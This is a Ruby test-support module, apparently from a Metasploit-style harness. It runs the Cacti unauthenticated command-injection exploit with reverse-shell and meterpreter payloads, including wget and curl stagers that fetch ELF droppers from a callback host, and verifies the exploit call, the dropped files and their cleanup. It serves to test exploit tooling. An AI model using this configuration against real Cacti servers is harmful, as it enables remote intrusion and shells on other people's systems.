# frozen_string_literal: true

require_relative 'session_support'
require_relative 'observe'

# Bind real Cacti stager commands and emitted ELF bytes to target state.
module CactiOwnerSessionTarget
  include CactiSdkTarget

  OWNER_FAMILIES = {
    'bash' => ['cmd/unix/reverse_bash', 'shell', nil],
    'php' => ['cmd/unix/php/meterpreter/reverse_tcp', 'meterpreter', nil],
    'echo32' => ['linux/x86/meterpreter/reverse_tcp', 'meterpreter', nil],
    'printf64' => ['linux/x64/meterpreter/reverse_tcp', 'meterpreter', nil],
    'wget32' => ['linux/x86/meterpreter_reverse_tcp', 'meterpreter', nil],
    'curl64' => ['linux/x64/meterpreter_reverse_tcp', 'meterpreter', nil]
  }.freeze

  def ks_owner_fullname
    CactiObservation::OWNER
  end

  def ks_families
    CactiSdkTarget::FAMILIES.merge(OWNER_FAMILIES)
  end

  def ks_start_owner(attempt, options, payload, reuse, offset)
    before_files, = rc_command('owner-tmp-baseline', 'app', 'sh', '-c', 'printf "%s\\n" /tmp/*')
    attempt[:tmp_baseline] = before_files.lines.map(&:strip)
    selected = @rc.fetch(:identity).fetch('selected')
    mode = @rc.fetch(:id_mode)
    target = %w[bash php].include?(attempt.fetch(:family)) ? 0 : 1
    owner_options = options.except('ExitOnSession', 'ListenerTimeout').merge(
      'TARGET' => target, 'AutoCheck' => true, 'ForceExploit' => false, 'WfsDelay' => 30,
      'MIN_HOST_ID' => selected.fetch('host_id'), 'MAX_HOST_ID' => selected.fetch('host_id'),
      'MIN_LOCAL_DATA_ID' => selected.fetch('local_data_id'), 'MAX_LOCAL_DATA_ID' => selected.fetch('local_data_id')
    )
    owner_options['HOST_ID'] = selected.fetch('host_id') if %w[manual host_only].include?(mode)
    owner_options['LOCAL_DATA_ID'] = selected.fetch('local_data_id') if %w[manual local_only].include?(mode)
    # A reused console selection must really clear previously supplied IDs.
    if reuse
      console_command('unset HOST_ID')
      console_command('unset LOCAL_DATA_ID')
    end
    flavor = { 'echo32' => 'auto', 'printf64' => 'printf', 'wget32' => 'wget', 'curl64' => 'curl' }[attempt.fetch(:family)]
    if flavor
      owner_options.merge!('CMDSTAGER::FLAVOR' => flavor, 'SRVHOST' => @callback.fetch('host'), 'SRVPORT' => ks_port, 'ListenerBindAddress' => @callback.fetch('bind'))
    end
    owner_options = owner_options.except('TARGET', 'PAYLOAD') if attempt.fetch(:label) == 'default_echo32'
    dropper_offset = rc_json('framework.instance_variable_get(:@cacti_dropper_events).length')
    output = run_target_module(ks_owner_fullname, 'app', owner_options, action: 'run -z', reuse_module: reuse, command_timeout: 150)
    attempt[:output_base64] = Base64.strict_encode64(output.b)
    events = ks_owner_events.drop(offset)
    attempt[:owner_events] = events
    owner_source = File.expand_path('modules/exploits/linux/http/cacti_unauthenticated_cmd_injection.rb')
    calls = events.select { |event| event['event'] == 'call' && event['method'] == 'exploit' }
    attempt[:exploit_call_sources] = calls.map { |event| event.fetch('source') }
    expect(calls.count { |event| File.expand_path(event.fetch('source')) == owner_source }).to eq(1)
    attempt[:owner_exploit_invoked] = true
    checks = events.select { |event| event['event'] == 'return' && event['method'] == 'check' }
    expect(checks.map { |event| event.fetch('check').fetch('code') }).to eq(['appears'])
    executions = events.select { |event| event['event'] == 'call' && event['method'] == 'execute_command' }
    expect(executions).not_to be_empty
    attempt[:dropper_events] = rc_json("framework.instance_variable_get(:@cacti_dropper_events).drop(#{dropper_offset})")
    selection = rc_json('active_module.object_id')
    expect(selection).to eq(@rc.fetch(:previous_owner_selection)) if reuse
    @rc[:previous_owner_selection] = selection
    attempt.merge!(selection: selection, id_mode: mode, options: owner_options)
    if target == 0
      expect(executions.length).to eq(1)
      encoded = executions.first.fetch('command_base64')
      attempt[:generated] = { 'owner' => ks_owner_fullname, 'payload' => payload, 'base64' => encoded, 'sha256' => Digest::SHA256.hexdigest(Base64.strict_decode64(encoded)) }
    else
      generated = attempt.fetch(:dropper_events).select { |event| event['elf'] }
      stagers = attempt.fetch(:dropper_events).select { |event| event['stager'] }
      expect(generated.length).to eq(1)
      expect(stagers.length).to eq(1)
      elf = generated.first.fetch('elf')
      expect(elf.fetch('elf_class')).to eq(%w[echo32 wget32].include?(attempt.fetch(:family)) ? 1 : 2)
      expect(Digest::SHA256.file(File.join(target_runtime.fetch('artifacts'), elf.fetch('file'))).hexdigest).to eq(elf.fetch('sha256'))
      stager = stagers.first.fetch('stager')
      expect(stager.fetch('flavor')).to eq(flavor == 'auto' ? 'echo' : flavor)
      expect(executions.map { |event| event.fetch('command_base64') }).to eq(stager.fetch('commands_base64'))
      expect(stager.fetch('path')).to match(%r{\A/tmp/[A-Za-z0-9]+\z})
      expect(attempt.fetch(:tmp_baseline)).not_to include(stager.fetch('path'))
      attempt[:dropper] = elf.merge(stager)
      if %w[wget curl].include?(flavor)
        served = attempt.fetch(:dropper_events).filter_map { |event| event['served'] }
        expect(served).to include(elf.slice('sha256', 'elf_class', 'bytes'))
      end
    end
  end

  def cacti_owner_session(family, mode:, reuse: false, label: family)
    @rc[:id_mode] = mode
    ks_session(family, owner: true, reuse: reuse, label: label)
    attempt = @rc.fetch(:sdk).last
    if attempt[:dropper]
      rc_poll(15) { !ks_inspect('file', attempt.fetch(:dropper).fetch('path')).fetch('exists') }
      attempt[:dropper_absent] = true
      if %w[wget32 curl64].include?(family)
        expect(attempt.fetch(:native_process).fetch('exe_sha256')).to eq(attempt.fetch(:dropper).fetch('sha256'))
        attempt[:stager_listener_cleanup] = ks_native('host_port', 'refused', attempt.fetch(:options).fetch('SRVPORT').to_s)
      end
    end
  ensure
    rc_save
  end
end
